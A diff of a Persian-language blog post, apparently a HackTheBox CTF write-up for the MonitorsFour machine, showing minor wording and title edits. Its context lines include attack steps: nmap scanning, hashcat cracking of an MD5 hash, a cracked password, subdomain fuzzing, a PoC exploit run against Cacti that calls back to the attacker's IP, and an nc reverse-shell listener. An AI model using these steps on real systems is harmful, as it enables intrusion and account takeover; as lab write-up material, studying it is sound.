@@ -1,7 +1,8 @@
 ---
 author: "amir_rabiee"
 pubDatetime: 2025-12-10T15:46:45.51
-title: "گزارش کامل از حل CTF MonitorsFour - HackTheBox"
+modDatetime: 2025-12-11T12:46:45.51
+title: "گزارش کامل از حل MonitorsFour - HTB"
 featured: false
 draft: false
 archived: false
@@ -46,7 +47,7 @@ description: "برچسب Easy, اما نه چندان ساده"
 nmap  10.10.11.98
 ```
 
-یه nmap زدم و دیدم که یه winrm و nginx در حال اجراست. وجود winrm به ما این نکته رو میده که احتمالا هاست از یه windows linux subsystem استفاده میکنه برای یه سرویس دیگه. 
+یه nmap زدم و دیدم که یه winrm و nginx در حال اجراست. وجود winrm به ما این نکته رو میده که احتمالا هاست از یه windows linux subsystem استفاده میکنه برای سرویس هاش. 
 
 با یه درخواست wget متوجه میشیم که redirect میشه به آدرس monitorsfour.htb
 و خب ازونجایی که طبیعتا DNS این دامنه resolve نمیشه باید اونو به hosts سیستم اضافه کرد.
@@ -104,7 +105,7 @@ hashcat -m 0 56b32eb43e6f15395f6c46c1c9e1cd36 /usr/share/wordlists/rockyou.txt
 همچنین یادم نره اینو بگم که توی مشخصات کاربران که بدست آوردیم، درکنار نام کاربری نام و نام خانوادگی ادمین Marcus Higgins بود.
 
 
-با این مشخصات توی فرم login انجام دادم و وارد پنل ادمین شدم. توی پنل یه نکته خیلی خیلی مهم بود. توی channellog شون نوشته بودن که از docker 4.44.2 دارن استفاده میکنن. این نسخه داکر یه CVE داره. [CVE-2025-9074](https://nvd.nist.gov/vuln/detail/CVE-2025-9074)
+با این مشخصات توی فرم login انجام دادم و وارد پنل ادمین شدم. توی پنل یه نکته خیلی خیلی مهم بود. توی changelog شون نوشته بودن که از docker 4.44.2 دارن استفاده میکنن. این نسخه داکر یه CVE داره. [CVE-2025-9074](https://nvd.nist.gov/vuln/detail/CVE-2025-9074)
 
 با بررسی های بیشتر متوجه شدم که قطعه های دیگه پازل جای دیگه هست و کارمون اینجا تقریبا تمومه. 
 
@@ -136,7 +137,7 @@ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.
 python3 poc.py -u marcus -p wonderful1 -i 10.10.14.147 -l 1234 -url http://cacti.monitorsfour.htb
 ```
 
-فقط قبل از اجرای این باید روی 1234 nc listener در حال اجرا باشه...
+فقط قبل از اجرای این باید nc listener در حال اجرا باشه...
 
 ```bash
 nc -lvnp 1234
